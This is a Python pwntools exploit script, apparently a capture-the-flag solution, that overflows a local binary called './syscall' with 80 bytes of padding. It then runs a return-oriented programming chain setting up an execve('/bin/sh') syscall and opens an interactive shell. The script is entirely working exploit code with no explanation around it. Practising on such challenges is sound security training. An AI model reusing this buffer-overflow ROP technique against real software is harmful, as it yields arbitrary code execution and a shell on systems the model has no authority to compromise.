#!/usr/bin/python
from pwn import *

bin_sh_addr = 0x4a1118
rop = ""
# 0x0000000000478566 : pop rax ; pop rdx ; pop rbx ; ret
rop += p64(0x478566)
rop += p64(59)
rop += p64(0)
rop += p64(0xdeadbeef)

# 0x0000000000401546 : pop rdi ; ret
rop += p64(0x401546)
rop += p64(bin_sh_addr)

# 0x0000000000401667 : pop rsi ; ret
rop += p64(0x401667)
rop += p64(0)

# 0x0000000000467205 : syscall ; ret
rop += p64(0x467205)

#print "A" * 80 + rop
p = process("./syscall")
p.sendline("A" * 80 + rop)
p.interactive()
